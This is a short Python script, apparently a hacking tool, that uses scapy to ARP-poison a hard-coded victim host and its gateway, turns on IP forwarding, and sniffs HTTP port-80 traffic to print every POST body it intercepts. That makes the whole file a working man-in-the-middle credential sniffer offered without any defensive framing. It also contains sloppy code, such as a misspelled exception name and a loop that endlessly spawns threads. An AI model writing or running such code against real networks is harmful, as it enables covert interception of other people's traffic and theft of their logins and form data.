#!/usr/bin/env python
from scapy.all import *
import threading
import os
import sys

VIP = '192.168.1.19'
GW = '192.168.1.254'
IFACE = 'eth0'

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
def display_post(packet):
    if packet[TCP].payload:
       	try:
            src  = packet[IP].src
	    dst  = packet[IP].dst
            pl   = str(bytes(packet[TCP].payload))     
	    if pl[:4] == 'POST':        
                print  "\n" * 2
		print "#" * 35
		print "%s SENT TO %s" % (src, dst)
		print "#" * 35
		print  "\n%s\n" % pl
	        print  "-" * 80         
	    else:
                return                                  
	except IndexError:
		return
 
 
def v_poison():
    v = ARP(pdst=VIP, psrc=GW)
    while True:
        try:   
            send(v,verbose=0,inter=1,loop=1)
        except KeyboardInterupt:
            sys.exit(1)
            
def gw_poison():
    gw = ARP(pdst=GW, psrc=VIP)
    while True:
        try:
            send(gw,verbose=0,inter=1,loop=1)
        except KeyboardInterupt:
            sys.exit(1)
 
vthread = []
gwthread = []  


while True:
    vpoison = threading.Thread(target=v_poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()        
    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()
    pkt = sniff(iface=IFACE,filter='tcp port 80',prn=display_post)
